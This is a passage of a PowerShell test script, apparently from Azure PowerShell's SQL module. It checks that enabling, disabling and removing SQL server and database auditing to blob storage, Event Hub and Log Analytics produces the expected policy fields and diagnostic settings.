		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlServerAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlServerAudit -BlobStorageTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlServerAudit -LogAnalyticsTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Set-AzSqlServerAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}	
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-RemoveAuditOnServer
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/master"

	try
	{
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		$policy = Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Get-AzSqlServerAudit
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Get-AzSqlServer -ResourceGroupName $params.rgname -ServerName $params.serverName | Set-AzSqlServerAudit -BlobStorageTargetState Enabled -StorageAccountResourceId $params.storageAccountResourceId -AuditActionGroup "SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP", "FAILED_DATABASE_AUTHENTICATION_GROUP" -RetentionInDays 8
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count

		
		Set-AzSqlServerAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.BlobStorageTargetState
		Assert-AreEqual $params.storageAccountResourceId $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-AreEqual 8 $policy.RetentionInDays
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 1 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.BlobStorageTargetState
		Assert-AreEqual 2 $policy.AuditActionGroup.Length
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::SUCCESSFUL_DATABASE_AUTHENTICATION_GROUP)}
		Assert-True {$policy.AuditActionGroup.Contains([Microsoft.Azure.Commands.Sql.Auditing.Model.AuditActionGroups]::FAILED_DATABASE_AUTHENTICATION_GROUP)}
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.StorageAccountResourceId
		Assert-AreEqual "Primary" $policy.StorageKeyType
		Assert-Null $policy.RetentionInDays
		
		
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}

function Test-NewDatabaseAuditDiagnosticsAreCreatedOnNeed
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/" + $params.databaseName

	try
	{
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-Null $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count

		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		Set-AzSqlDatabaseAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId

		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count

		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count
		
		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId

		
		Set-AzSqlDatabaseAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count

		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Set-AzSqlDatabaseAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		Set-AzSqlDatabaseAudit -LogAnalyticsTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Set-AzSqlDatabaseAudit -EventHubTargetState Disabled -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		$policy = Get-AzSqlDatabaseAudit -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual 0 $policy.AuditAction.Length
		Assert-AreEqual "" $policy.PredicateExpression
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId
		
		
		Assert-AreEqual 0 (Get-AzDiagnosticSetting -ResourceId $resourceId).count
	}
	finally
	{
		
		Remove-BlobAuditingTestEnvironment $testSuffix
	}
}


function Test-NewServerAuditDiagnosticsAreCreatedOnNeed
{
	
	$testSuffix = getAssetName
	Create-BlobAuditingTestEnvironment $testSuffix
	$params = Get-SqlBlobAuditingTestEnvironmentParameters $testSuffix
	$subscriptionId = (Get-AzContext).Subscription.Id
	$workspaceResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.operationalinsights/workspaces/" + $params.workspaceName
	$eventHubAuthorizationRuleResourceId = "/subscriptions/" + $subscriptionId + "/resourcegroups/" + $params.rgname + "/providers/microsoft.EventHub/namespaces/" + $params.eventHubNamespace + "/authorizationrules/RootManageSharedAccessKey"
	$resourceId = "/subscriptions/" + $subscriptionId + "/resourceGroups/" + $params.rgname + "/providers/Microsoft.Sql/servers/" + $params.serverName + "/databases/master"

	try
	{
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Disabled" $policy.EventHubTargetState
		Assert-AreEqual 0 $policy.AuditActionGroup.Length
		Assert-Null $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace

		
		Assert-AreEqual "Disabled" $policy.LogAnalyticsTargetState
		Assert-Null $policy.WorkspaceResourceId

		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count (($diagnostics).count + "1")

		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights

		
		Set-AzSqlServerAudit -LogAnalyticsTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -WorkspaceResourceId $workspaceResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId

		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual 2 (Get-AzDiagnosticSetting -ResourceId $resourceId).count "2"
		
		
		Remove-AzDiagnosticSetting -ResourceId $resourceId -Name $settingsName
		
		
		$diagnostics = Get-AzDiagnosticSetting -ResourceId $resourceId
		Assert-AreEqual 1 ($diagnostics).count "3"
		
		
		$settingsName = ($diagnostics)[0].Name
		Set-AzDiagnosticSetting -ResourceId $resourceId -Enabled $True -Name $settingsName -Category SQLInsights
		
		
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $workspaceResourceId $policy.WorkspaceResourceId
		
		
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Set-AzSqlServerAudit -EventHubTargetState Enabled -ResourceGroupName $params.rgname -ServerName $params.serverName -EventHubAuthorizationRuleResourceId $eventHubAuthorizationRuleResourceId
		$policy = Get-AzSqlServerAudit -ResourceGroupName $params.rgname -ServerName $params.serverName
		Assert-AreEqual "Enabled" $policy.EventHubTargetState
		Assert-AreEqual 3 $policy.AuditActionGroup.Length
		Assert-AreEqual $eventHubAuthorizationRuleResourceId $policy.EventHubAuthorizationRuleResourceId
		Assert-Null $policy.EventHubNamespace
		
		
		Assert-AreEqual "Enabled" $policy.LogAnalyticsTargetState
